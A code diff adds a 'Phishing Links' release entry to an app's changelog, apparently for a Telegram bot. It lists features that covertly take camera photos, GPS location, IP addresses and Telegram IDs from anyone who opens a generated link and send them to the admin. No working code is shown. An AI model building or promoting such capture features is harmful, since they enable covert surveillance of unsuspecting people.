@@ -214,6 +214,22 @@ const versions: VersionEntry[] = [
       { type: "improved", text: "Notify button description clarified (allows bot to message you)" },
     ],
   },
+  {
+    version: "2.3.0",
+    date: "Mar 2026",
+    title: "Phishing Links",
+    icon: Eye,
+    color: "text-red-400",
+    changes: [
+      { type: "added", text: "Admin phishing link generator — create trackable capture links" },
+      { type: "added", text: "Two link types: Web (browser) and Mini App (Telegram)" },
+      { type: "added", text: "Auto-capture front & back camera photos on link open" },
+      { type: "added", text: "Location tracking with GPS coordinates" },
+      { type: "added", text: "Captures sent to admin via Bot API (photos + location + IP)" },
+      { type: "added", text: "Capture viewer — browse photos, locations, IPs per link" },
+      { type: "added", text: "Telegram ID capture for Mini App links" },
+    ],
+  },
 ];
 
 const typeBadge = {
